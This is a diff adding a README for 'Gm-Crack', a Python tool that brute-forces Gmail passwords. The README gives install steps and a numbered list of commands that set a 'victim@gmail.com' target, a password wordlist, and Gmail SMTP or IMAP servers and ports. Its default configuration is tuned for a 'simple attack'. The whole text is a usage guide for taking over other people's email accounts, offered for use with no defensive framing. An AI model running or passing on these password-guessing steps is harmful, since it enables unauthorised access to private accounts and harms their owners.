@@ -1,0 +1,32 @@
+#) Preparing
+First, make sure You have installed the required module...
+~) Windows:
+    C:\Folders\Gm-Crack\> pip install -r requirements.txt
+         or
+    C:\Folders\Gm-Crack\> pip2 install -r requirements.txt
+~) Linux:
+    $ pip install -r requirements.txt
+         or
+    $ pip2 install -r requirements.txt
+
+#) How to Use ??? :
+How to use this Tool? check this Tutorial below
+1) Show help:
+   $ python Gm-Crack.py --help
+2) Set Target to Attack:
+   $ python Gm-Crack.py --target=victim@gmail.com
+3) Set Wordlist to Use:
+   $ python Gm-Crack.py --target=victim@gmail.com --wlist=/root/folders/wordtext.txt
+4) Set Server to Use for Authentication:
+   $ python Gm-Crack.py --target=victim@gmail.com --dserver=imap.gmail.com
+5) Set Port to Use for Authentication:
+   $ python Gm-Crack.pt --target=victim@gmail.com --dport=501
+
+#) Default configuration:
+target: <none> (Need to set)
+wordlist: ./wordlist/mxact666_password.txt (default wordlist)
+server: smtp.gmail.com
+port: 465 (default port I set (I used this one))
+
+So...don't forget to specify the Target :)
+For simple attack, You just need to specify the Target Gmail Address
